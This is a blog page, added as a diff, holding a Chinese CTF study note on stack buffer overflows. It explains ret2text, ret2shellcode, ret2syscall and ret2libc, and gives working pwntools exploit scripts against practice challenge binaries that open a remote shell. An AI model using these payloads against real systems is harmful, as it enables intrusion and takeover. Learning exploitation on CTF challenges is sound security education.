@@ -1,0 +1,706 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Stefansky">
+  <meta name="keywords" content="Stefansky">
+  
+    <meta name="description" content="栈溢出栈栈是一种数据结构，遵循后进先出的原则(Last in First Out)，主要有压栈（push）与出栈（pop）两种操作eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。在栈中，esp保存栈帧的栈顶地址，ebp保存栈帧的栈底地址 程序的栈是从进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出">
+<meta property="og:url" content="https://stefansky07.github.io/2026/04/15/ctf_publish_ready/01-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%97%A5%E5%B8%B8%E9%A2%98%E5%8D%95/PWN/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="Stefansky">
+<meta property="og:description" content="栈溢出栈栈是一种数据结构，遵循后进先出的原则(Last in First Out)，主要有压栈（push）与出栈（pop）两种操作eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。在栈中，esp保存栈帧的栈顶地址，ebp保存栈帧的栈底地址 程序的栈是从进">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312220558-9bu4qm0.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312220618-hdrtkmt.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312220657-o3nr5tx.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312220744-tt3moj5.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312220814-mpb0x7v.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312220905-37qypl4.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221113-mxk475l.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221153-94tsrdq.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221331-71uj91q.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221348-wrl8flz.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221450-ykjik6e.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221514-5uawug5.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221554-r0paeyh.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221613-8q4mwpe.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221734-049z3sa.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221747-v4dlh93.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221804-pqlau60.png">
+<meta property="og:image" content="https://stefansky07.github.io/assets/image-20250312221822-dr1wt4r.png">
+<meta property="article:published_time" content="2026-04-14T18:33:22.000Z">
+<meta property="article:modified_time" content="2026-04-15T02:56:36.662Z">
+<meta property="article:author" content="Stefansky">
+<meta property="article:tag" content="Stefansky">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://stefansky07.github.io/assets/image-20250312220558-9bu4qm0.png">
+  
+  
+  
+  <title>栈溢出 - Stefansky</title>
+
+  <link  rel="stylesheet" href="//lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="//lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="//lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"stefansky07.github.io","root":"/","version":"1.9.8","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Stefansky</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">栈溢出</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 02:33" pubdate>
+          2026年4月15日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">栈溢出</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>栈是一种数据结构，遵循后进先出的原则(Last in First Out)，主要有压栈（push）与出栈（pop）两种操作<br>eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。<br>在栈中，esp保存栈帧的栈顶地址，ebp保存栈帧的栈底地址</p>
+<p><strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong></p>
+<h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。</p>
+<p>栈溢出的前提是：程序向栈上写入数据；数据的长度不受控制</p>
+<p>最简单的栈溢出就是通过溢出，覆盖程序的返回地址，将返回地址覆盖为system(‘&#x2F;bin&#x2F;sh’)的地址</p>
+<h1 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h1><p>通过CTFHUB技能树中的ret2text进行栈溢出</p>
+<p>首先下载附件，利用checksec检查程序开启的保护</p>
+<p><img src="/assets/image-20250312220558-9bu4qm0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>该程序未开启保护，并且是amd的64位程序，拖入ida进行静态分析</p>
+<p><img src="/assets/image-20250312220618-hdrtkmt.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>阅读代码发现程序调用了gets函数，gets本身是一个危险函数，它不会对字符串的长度进行校验，而是以回车判断输入是否结束，存在栈溢出漏洞</p>
+<p>shift+f12发现程序中有可执行后门system(‘&#x2F;bin&#x2F;sh’)</p>
+<p><img src="/assets/image-20250312220657-o3nr5tx.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>那么溢出ret到执行system(‘&#x2F;bin&#x2F;sh’)的地址即可，双击&#x2F;bin&#x2F;sh，ctrl+x追踪到&#x2F;bin&#x2F;sh的地址为0x04007B8</p>
+<p><img src="/assets/image-20250312220744-tt3moj5.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>查看v4，发现设定的v4长度为0x70，同时由于是64位系统，需要+8字节覆盖掉ebp（32位系统+4字节覆盖掉ebp）</p>
+<p><img src="/assets/image-20250312220814-mpb0x7v.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>接下来就可以编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>p = remote(<span class="hljs-string">&quot;challenge-5ed622b3b63a7e82.sandbox.ctfhub.com&quot;</span>,<span class="hljs-number">28525</span>)<br><span class="hljs-comment">#/bin/sh的地址</span><br>shell_addr = <span class="hljs-number">0x04007B8</span><br><span class="hljs-comment">#生成0x70+8个垃圾数据覆盖参数和ebp，然后把/bin/sh的地址写入返回地址</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>) + p64(shell_addr)  <br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250312220905-37qypl4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>所以进行栈溢出需要两个重要的步骤：一是寻找危险函数（ gets、scanf、vscanf、sprintf、strcpy、strcat、bcopy等）；二是确定填充长度，计算要操作的地址与要覆盖的地址的距离</p>
+<h1 id="没有后门时的栈溢出利用"><a href="#没有后门时的栈溢出利用" class="headerlink" title="没有后门时的栈溢出利用"></a>没有后门时的栈溢出利用</h1><p>ret2text中拿到shell是通过将eip覆盖为system(“&#x2F;bin&#x2F;sh”)的地址，如果程序中没有后门，一般可以通过以下几种方式利用</p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。利用方式是将shellcode写入程序，然后利用栈溢出将eip的返回地址覆盖为shellcode的地址，进而让程序执行shellcode。这就需要程序中存在一个位置能够让我们写入shellcode并执行（比如bss段）。</p>
+<p>以NewStarCTF中的ret2shellcode为例</p>
+<p>将附件拖入IDA，注意到<code>mmap</code>​函数，它是向文件映射去申请一块内存，是动态库，共享内存等映射物理空间的内存。</p>
+<p><img src="/assets/image-20250312221113-mxk475l.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>通过pwndbg可以看到，映射的区域有可执行权限</p>
+<p><img src="/assets/image-20250312221153-94tsrdq.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>而且mmap指定了buf的起始地址为0x233000，因此可以利用第一个read向buff中写入shellcode，再通过第二个read进行栈溢出，将返回地址覆盖为0x233000</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#用pwntools生成shellcode</span><br>shellcode = asm(shellcraft.sh())<br>p = remote(<span class="hljs-string">&#x27;219.219.61.234&#x27;</span>,<span class="hljs-number">49544</span>)<br>p.recvline()<br><span class="hljs-comment">#把shellcode写入buf</span><br>p.sendline(shellcode)<br>p.recvline()<br><span class="hljs-comment">#计算偏移，栈溢出到buf</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x233000</span>)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
+<p>系统调用是指由操作系统提供的供所有系统调用的程序接口集合;用户程序通常只在用户态下运行，当用户程序想要调用只能在内核态运行的子程序时，操作系统需要提供访问这些内核态运行的程序的接口，这些接口的集合就叫做系统调用，简要的说，系统调用是内核向用户进程提供服务的唯一方法。</p>
+<p>用户程序通过系统调用从用户态（user mode）切换到核心态（kernel mode ），从而可以访问相应的资源。</p>
+<p>要使用系统调用，需要通过汇编指令 <code>int 0x80</code>​ 实现，用系统调用号来区分入口函数。</p>
+<p>以CTFWIKI中的 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a>为例</p>
+<p>首先检测程序开启的保护</p>
+<p><img src="/assets/image-20250312221331-71uj91q.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>32位，开启了NX保护，拖入IDA查看源代码</p>
+<p><img src="/assets/image-20250312221348-wrl8flz.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可以看到依然是gets函数的栈溢出，但是由于程序本身没有后门，并且无法自己写入shellcode来获得shell，这是就要用到系统调用。</p>
+<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用。这里可以用<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>​这个系统调用来获取shell，其中execve 对应的系统调用号为0xb</p>
+<p>由于程序是32位的，按照<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>​,令eax为execve的系统调用号即0xb，第一个参数ebx指向&#x2F;bin&#x2F;sh，ecx和edx为0</p>
+<p>而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这里需要用到ROPgadget寻找gadget</p>
+<p><img src="/assets/image-20250312221450-ykjik6e.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>先找到控制eax的gadget，这几个都可以控制eax，这里使用第二个</p>
+<p>再找控制ebx的</p>
+<p><img src="/assets/image-20250312221514-5uawug5.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>以上都可以使用，由于0x0806eb68可以控制三个寄存器，所以选用这个地址</p>
+<p>然后找到&#x2F;bin&#x2F;sh的地址</p>
+<p><img src="/assets/image-20250312221554-r0paeyh.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>以及int 0x80的地址</p>
+<p><img src="/assets/image-20250312221613-8q4mwpe.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_ebx_ecx_edx_ret = <span class="hljs-number">0x0806eb90</span><br>sh = <span class="hljs-number">0x080be408</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + p32(pop_eax_ret) + p32(<span class="hljs-number">0xb</span>) + p32(pop_ebx_ecx_edx_ret) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(sh) + p32(int_0x80)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<p>根据NewStarCTF的ret2libc进行学习</p>
+<p>首先下载附件，得到一个程序以及程序用到的libc，将程序拖入IDA分析</p>
+<p><img src="/assets/image-20250312221734-049z3sa.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>很明显fgets处存在栈溢出，但通过寻找，没有发现可利用的函数</p>
+<p><img src="/assets/image-20250312221747-v4dlh93.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>根据动态链接和延迟绑定技术,运用任意地址读写技术对某个函数的GOT表进行改写,使其指向想要执行的危险函数[如<code>system</code>​ , <code>execve</code>​函数]</p>
+<p>操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，也就是控制执行 libc（对应版本）中的函数，通常是返回至某个函数的plt处或者函数的具体位置 (即函数对应的got表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)（或者execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)），故而此时我们需要知道system函数的地址</p>
+<p>所以首先要做的是通过栈溢出，泄露出puts真实的地址，然后计算真实地址与libc中puts地址的偏移，进而计算出system与&#x2F;bin&#x2F;sh的地址，同时还要获取rdi、ret与main函数的地址</p>
+<p><img src="/assets/image-20250312221804-pqlau60.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可以使用pwndbg寻找main函数的起始地址</p>
+<p><img src="/assets/image-20250312221822-dr1wt4r.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25948</span>)<br><br><span class="hljs-comment">#puts的plt表与got表地址</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>] <br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#libc中puts、system、/bin/sh的地址</span><br>libc_puts = libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_system = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_sh = libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>pop_ret_rdi = <span class="hljs-number">0x400753</span><br>main = <span class="hljs-number">0x400698</span><br>ret = <span class="hljs-number">0x40050e</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;time?\n&#x27;</span>)<br><span class="hljs-comment">#64位的payload构成：栈溢出+pop rdi地址+泄露函数的got表地址+泄露函数的plt地址+ret指令（这里ret回main函数是为了跳回程序开头重新执行程序）</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>) + p64(pop_ret_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br><br><span class="hljs-comment">#直到7f出现的位置作为终点，开始往前读6个字节数据，然后再8字节对齐，不足8位补\x00</span><br><span class="hljs-comment">#\x7f是64位程序函数地址的默认开头，-6就是从倒数第6个字节开始取,在内存中是倒着放的</span><br><span class="hljs-comment">#32位u32(r.recv()[0:4])</span><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#puts函数的真实地址</span><br><span class="hljs-comment">#偏移</span><br>base = puts_addr - libc_puts<br><span class="hljs-comment">#真实的system和/bin/sh地址</span><br>system_addr = base + libc_system<br>sh_addr = base + libc_sh<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>) + p64(ret) + p64(pop_ret_rdi) + p64(sh_addr) + p64(system_addr)<br>p.sendline(payload)<br>p.interactive()<br><br><span class="hljs-comment">#也可以不获取main函数地址，将exp分成两个py脚本，获取main函数地址并ret回去只是为了在一个脚本里执行两次程序</span><br><br></code></pre></td></tr></table></figure>
+
+<p>栈溢出的中高级ROP会在其它二进制漏洞学习完之后再开始学习</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>栈溢出</div>
+      <div>https://stefansky07.github.io/2026/04/15/ctf_publish_ready/01-刷题笔记/日常题单/PWN/栈溢出/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Stefansky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/15/ctf_publish_ready/01-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%97%A5%E5%B8%B8%E9%A2%98%E5%8D%95/Reverse/%E4%B8%80%E4%B8%AA%E8%A5%BF%E7%93%9C%E5%88%87%E4%B8%A4%E5%8D%8A%E4%BD%A0%E4%B8%80%E5%8D%8A%E6%88%91%E4%B8%80%E5%8D%8A/" title="一个西瓜切两半你一半我一半">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">一个西瓜切两半你一半我一半</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/15/ctf_publish_ready/01-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%97%A5%E5%B8%B8%E9%A2%98%E5%8D%95/Reverse/%E6%8E%A2%E7%B4%A2%E8%BF%9B%E5%88%B6%E7%9A%84%E5%A5%A5%E7%A7%98/" title="探索进制的奥秘">
+                        <span class="hidden-mobile">探索进制的奥秘</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
